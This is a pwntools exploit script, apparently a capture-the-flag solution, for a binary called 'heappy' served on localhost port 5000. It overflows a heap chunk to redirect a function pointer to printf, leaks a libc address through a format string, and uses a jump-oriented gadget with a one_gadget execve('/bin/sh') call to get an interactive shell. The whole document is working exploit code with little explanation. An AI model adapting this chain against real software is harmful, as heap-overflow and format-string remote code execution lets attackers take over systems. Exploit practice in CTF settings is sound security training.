from pwn import *


def recv_n_lines(r, n):
    for _ in range(n):
        r.recvline()


# this is a working script but I wrote a cleaner one
def main():
    local = False
    filename = "./heappy_patchelf"
    elf = ELF(filename)
    libc = ELF("./libc-2.19.so")
    context.binary = elf
    skip_lang, skip_name, skip_menu = 4, 2, 5
    if local:
        r = process([filename])
    else:
        # r = process(["sshpass", "-p", "root", "ssh", "-tt", "root@localhost", "-p", "5000"])
        r = remote("localhost", 5000)
    padding = 144
    target = elf.symbols['printf'] # for leakage
    payload = b'A' * padding + p64(target)
    payload = payload[:-1] # the last null byte is added by scanf
    recv_n_lines(r, skip_lang)
    # choose language
    r.sendline("1")
    recv_n_lines(r, skip_name)
    # choose name
    r.sendline("pwn")
    recv_n_lines(r, skip_menu)
    # change language -> allocate new chunk
    r.sendline("2")
    recv_n_lines(r, skip_lang)
    # ita language
    r.sendline("2")
    recv_n_lines(r, skip_menu)
    # change name
    r.sendline("1")
    recv_n_lines(r, skip_name)
    # overflow in functions' chunk
    r.sendline(payload)
    r.recvuntil('nome?')
    # for libc leak
    r.sendline('%13$p')
    r.recvuntil('nome?')
    # now, for some reason, the program is buggy and always asks for name
    r.sendline('pwn')
    r.recvline()
    leak = r.recvline()
    leak = bytes.fromhex(leak.split(b'0x')[1][:12].decode())[::-1]
    leak = u64(leak + b'\x00' * 2)
    libc.address = leak - 245 - libc.symbols["__libc_start_main"]
    # 0x0000000000198aec : pop rax ; xor al, 0xed ; jmp qword ptr [rdx]
    # to satisfy:
    """
    0x4647c execve("/bin/sh", rsp+0x30, environ)
    constraints:
      [rsp+0x30] == NULL
    """
    move_stack_JOP_gadget = p64(libc.address + 0x0000000000198aec)
    one_gadget_RCE_constrained = p64(libc.address + 0x4647c)
    if not local:
        # need to escape chars that are filtered by tty; the escape sequence will be stripped
        tty_wrap = lambda x: b''.join([b'\x16' + i.to_bytes(1, 'little') for i in x])
        move_stack_JOP_gadget = tty_wrap(move_stack_JOP_gadget)
        one_gadget_RCE_constrained = tty_wrap(one_gadget_RCE_constrained)
    payload = one_gadget_RCE_constrained + b"A" * (padding - 8) + move_stack_JOP_gadget
    # bad chars for scanf
    bad_chars = [b'\t', b'\n', b' ']
    assert all([i not in payload for i in bad_chars])
    r.recvuntil('?')
    r.send(payload + b'\n')
    r.interactive()


if __name__ == "__main__":
    main()

    

 
